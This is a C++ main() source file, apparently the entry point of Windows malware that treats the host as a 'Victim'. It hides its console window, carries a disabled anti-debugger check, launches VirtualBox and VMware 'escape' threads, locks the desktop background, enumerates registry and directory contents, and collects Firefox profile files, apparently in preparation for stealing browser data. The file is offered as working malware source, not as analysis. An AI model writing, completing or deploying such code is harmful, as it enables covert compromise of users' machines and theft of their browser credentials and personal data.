#include "Includes.h"
#include "Registry.h"
#include "Victim.h"
#include "VMEscape.h"
#include "Misc.h"
#include <filesystem>

int main(int argc, char* argv[]) {
#ifndef _DEBUG
//	if (IsDebuggerPresent()) {
//		exit(EXIT_FAILURE);
//	}
	HWND hWindowConsole;
	AllocConsole();
	hWindowConsole = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWindowConsole, 0);
#endif
	std::thread virtualBoxChange(VMEscape::virtualBoxEscape);
	std::thread VMWareBoxChange(VMEscape::VMWareEscape);
	//Check permissions if we are admin, lock backgroundChange
	std::thread tBackgroundChange(SCH::LockBackground);
	
	Victim CurrentComputer;
	Registers::Key CentralProcessorSubKeys = Registers::RegEnumSubKeys(HKEY_LOCAL_MACHINE, "Hardware\\Description\\System\\CentralProcessor");
	//std::thread t_DirectoriesEnumeration(computer->);
	CurrentComputer.GetDirectoryList();
	virtualBoxChange.join();
	VMWareBoxChange.join();
	tBackgroundChange.join();
	CurrentComputer.FirefoxProfileList = CurrentComputer.GetFirefoxProfilesList(CurrentComputer.p_FirefoxAppData);
	for (int i = 0; i < CurrentComputer.FirefoxProfileList.size();i++) {
			CurrentComputer.FirefoxProfileList[i] = CurrentComputer.GetProfileContent(CurrentComputer.FirefoxProfileList[i]);
			for (std::wstring const& fileList : CurrentComputer.FirefoxProfileList[i].ProfileFiles) {
			}
	}
}
